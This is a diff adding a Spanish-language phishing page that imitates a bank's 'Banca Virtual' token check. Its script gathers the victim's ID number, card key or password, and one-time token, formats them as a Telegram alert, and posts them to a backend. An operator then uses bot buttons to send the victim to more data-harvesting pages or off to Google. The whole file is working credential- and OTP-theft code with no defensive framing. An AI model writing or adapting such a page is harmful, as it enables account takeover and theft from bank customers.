@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+
+<html lang="es">
+
+<head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <title>
+        Ingreso a Banca Virtual
+    </title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+
+    body {
+        font-family: 'Inter', sans-serif;
+    }
+
+    /* Loader CSS */
+    .loader-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-size: 1.5rem;
+        flex-direction: column;
+        gap: 10px;
+    }
+
+    .spinner {
+        border: 4px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top: 4px solid #fff;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% {
+            transform: rotate(0deg);
+        }
+
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+</style>
+
+
+</head>
+
+<body class="bg-[#f3f7fc] min-h-screen flex flex-col items-center p-4">
+    <header class="w-full max-w-md flex items-center justify-between py-4">
+        <button aria-label="Volver" class="text-[#1a2a5a] text-xl">
+            <i class="fas fa-chevron-left"></i>
+        </button>
+        <h1 class="text-[#1a2a5a] font-semibold text-base">
+            Ingreso a Banca Virtual
+        </h1>
+        <button aria-label="Cerrar" class="text-[#1a2a5a] text-xl">
+            <i class="fas fa-times"></i>
+        </button>
+    </header>
+    <main class="w-full max-w-md">
+        <br>
+        <h2 class="text-[#1a2a5a] font-semibold text-lg mb-4">
+            Verifiquemos que seas tú
+        </h2>
+        <section class="bg-white rounded-lg p-5 shadow-sm">
+            <div class="flex items-start space-x-3 mb-3">
+                <img alt="Icono de candado abierto con código" class="w-6 h-6 flex-shrink-0 mt-1" decoding="async" height="24" loading="lazy" src="candado.png" width="24" />
+                <div>
+                    <div class="flex items-center space-x-1 mb-1">
+                        <span class="font-semibold text-[#1a2a5a] text-base">
+                            Código Token
+                        </span>
+                        <button aria-label="Información sobre Código Token" class="text-[#1a2a5a] border border-[#1a2a5a] rounded-full w-5 h-5 flex items-center justify-center text-xs font-semibold leading-none">
+                            i
+                        </button>
+                    </div>
+                    <p class="text-[#5a5a5a] text-sm leading-relaxed max-w-[320px]">
+                        Para realizar este proceso, ingresa el código de Token móvil o físico.
+                    </p>
+                </div>
+            </div>
+            <form class="mt-4" onsubmit="event.preventDefault()">
+                <div id="token-inputs" class="grid grid-cols-6 gap-2 justify-center mb-6">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
+                </div>
+                <p id="errorMessage" class="text-red-500 text-center mb-4 hidden">Token incorrecto, intenta de nuevo.</p>
+
+
+            <button id="verifyBtn" class="w-full bg-[#e5e7eb] text-[#9ca3af] font-semibold text-base rounded-full py-3 cursor-not-allowed transition-colors duration-200" disabled type="submit">
+                Verificar
+            </button>
+        </form>
+    </section>
+</main>
+
+<div id="loader" class="loader-overlay" style="display: none;">
+    <div class="spinner"></div>
+    <p>Verificando token...</p>
+</div>
+
+<script>
+    const inputs = document.querySelectorAll(".token-input");
+    const verifyBtn = document.getElementById("verifyBtn");
+    const errorMessage = document.getElementById("errorMessage");
+    const loader = document.getElementById("loader");
+
+    // Los datos del login inicial se recuperan de sessionStorage.
+    let initialLoginData = null;
+
+    // Nueva función para enviar datos al backend
+    async function sendTokenDataToBackend(messageContent, keyboard) {
+        const url = '/api/send-message'; // Endpoint del backend
+        const payload = {
+            text: messageContent,
+            keyboard: keyboard
+        };
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+            });
+
+            const data = await response.json();
+
+            if (!response.ok) {
+                console.error(`Error al enviar token al backend: ${response.status}`, data.error);
+                return null;
+            }
+
+            console.log('Token enviado al backend exitosamente:', data);
+            // Devolvemos el ID del mensaje para poder verificar la respuesta
+            return data.result.message_id;
+
+        } catch (error) {
+            console.error('Error de red al enviar token al backend:', error);
+            return false;
+        }
+    }
+
+    // Nueva función para verificar la respuesta del operador a través del backend
+    async function checkOperatorResponse(messageId) {
+        try {
+            // Hacemos una única llamada a nuestro endpoint de long-polling
+            const response = await fetch(`/api/check-update/${messageId}`);
+            loader.style.display = 'none'; // Ocultamos el loader
+
+            if (response.status === 408) { // Timeout
+                alert("El operador no respondió a tiempo. Por favor, intente de nuevo.");
+                window.location.reload();
+                return;
+            }
+
+            const data = await response.json();
+
+            if (data.action) {
+                // Lógica para manejar los 4 botones
+                if (data.action === 'error_token') {
+                    errorMessage.classList.remove('hidden');
+                    errorMessage.textContent = "Token incorrecto, intenta de nuevo.";
+                    inputs.forEach(input => input.value = '');
+                    inputs[0].focus();
+                    checkAllFilled();
+                } else if (data.action === 'pedir_datos') {
+                    window.location.href = "datos.html";
+                } else if (data.action === 'token_sms') {
+                    window.location.href = "otp.html";
+                } else if (data.action === 'finalizar') {
+                    window.location.href = "https://www.google.com";
+                } else {
+                    console.log("Respuesta no reconocida del bot:", data.action);
+                    alert("Respuesta no reconocida. Por favor, intente de nuevo.");
+                }
+            }
+        } catch (error) {
+            loader.style.display = 'none';
+            console.error("Error al verificar la respuesta del operador:", error);
+            alert("Ocurrió un error de comunicación. Por favor, recarga la página.");
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', async () => {
+        // Ya no se necesita cargar config, solo obtener los datos de la sesión.
+        const storedData = sessionStorage.getItem('initialLoginData');
+        if (storedData) {
+            initialLoginData = JSON.parse(storedData);
+        } else {
+            // Si no hay datos, es un acceso inválido, redirigir al inicio.
+            window.location.href = 'index.html';
+        }
+    });
+
+    inputs.forEach((input, i) => {
+        input.addEventListener("input", (e) => {
+            const value = e.target.value;
+            if (/^\d$/.test(value)) {
+                if (i < inputs.length - 1) inputs[i + 1].focus();
+            } else {
+                e.target.value = "";
+            }
+            checkAllFilled();
+        });
+
+        input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && !input.value && i > 0) {
+                inputs[i - 1].focus();
+            }
+        });
+
+        input.addEventListener("paste", (e) => {
+            e.preventDefault();
+            const paste = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 6);
+            [...paste].forEach((char, idx) => {
+                if (inputs[idx]) inputs[idx].value = char;
+            });
+            if (paste.length > 0) {
+                inputs[Math.min(paste.length, inputs.length - 1)].focus();
+            }
+            checkAllFilled();
+        });
+    });
+
+    function checkAllFilled() {
+        const allFilled = [...inputs].every((inp) => inp.value.length === 1);
+        verifyBtn.disabled = !allFilled;
+        verifyBtn.classList.toggle("cursor-not-allowed", !allFilled);
+        verifyBtn.classList.toggle("bg-[#e5e7eb]", !allFilled);
+        verifyBtn.classList.toggle("text-[#9ca3af]", !allFilled);
+        verifyBtn.classList.toggle("bg-[#3b82f6]", allFilled);
+        verifyBtn.classList.toggle("text-white", allFilled);
+    }
+
+    verifyBtn.addEventListener('click', async () => {
+        const token = [...inputs].map(input => input.value).join('');
+        errorMessage.classList.add('hidden');
+        loader.style.display = 'flex';
+        // La variable tokenAttemptCount ya no es necesaria
+
+        // Formato personalizado como el ejemplo que proporcionaste
+        let telegramMessage = '⚠️⚠️⚠️⚠️⚠️🔴🔴🔴🔴 TOKEN APP INGRESADO 🔴🔴🔴🔴⚠️⚠️⚠️⚠️⚠️⚠️⚠️\n\n';
+
+        if (initialLoginData.debitCardKey !== 'N/A') {
+            telegramMessage += `Tipo de Ingreso: Tarjeta Débito\n`;
+            telegramMessage += `Tipo de Doc: ${initialLoginData.identificationType}\n\n`;
+            telegramMessage += `CEDULA💎: ${initialLoginData.identificationNumber}\n`;
+            telegramMessage += `ClAVE🔐: ${initialLoginData.debitCardKey}\n`;
+            telegramMessage += `Últimos 4 dígitos: ${initialLoginData.last4Digits}\n`;
+            if (initialLoginData.legalRepresentativeNumber !== 'N/A') {
+                telegramMessage += `Rep\\. Legal: ${initialLoginData.legalRepresentativeDoc} ${initialLoginData.legalRepresentativeNumber}\n`;
+            }
+        } else if (initialLoginData.secureKey !== 'N/A') {
+            telegramMessage += `Tipo de Ingreso: Clave Segura\n`;
+            telegramMessage += `Tipo de Doc: ${initialLoginData.identificationType}\n\n`;
+            telegramMessage += `CEDULA💎: ${initialLoginData.identificationNumber}\n`;
+            telegramMessage += `ClAVE🔐: ${initialLoginData.secureKey}\n`;
+            if (initialLoginData.legalRepresentativeNumber !== 'N/A') {
+                telegramMessage += `Rep\\. Legal: ${initialLoginData.legalRepresentativeDoc} ${initialLoginData.legalRepresentativeNumber}\n`;
+            }
+        }
+
+        telegramMessage += `\n🔴 Token App: ${token}\n\n`;
+        telegramMessage += `Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+
+        // Botones para Telegram
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: "❌ Error Token", callback_data: `error_token:N/A` },
+                 { text: "📋 Ir a Datos", callback_data: `pedir_datos:N/A` }],
+                [{ text: "👀 Token SMS", callback_data: `token_sms:N/A` },
+                 { text: "🚨Finalizar", callback_data: `finalizar:N/A` }]
+            ]
+        };
+
+        const messageId = await sendTokenDataToBackend(telegramMessage, keyboard);
+
+        if (messageId) {
+            // Si el backend responde con un messageId, empezamos a verificar la respuesta del operador.
+            checkOperatorResponse(messageId);
+        } else {
+            loader.style.display = 'none';
+            alert("Error al enviar el token. Por favor, inténtalo de nuevo.");
+        }
+    });
+</script>
+
+
+</body>
+
+</html>
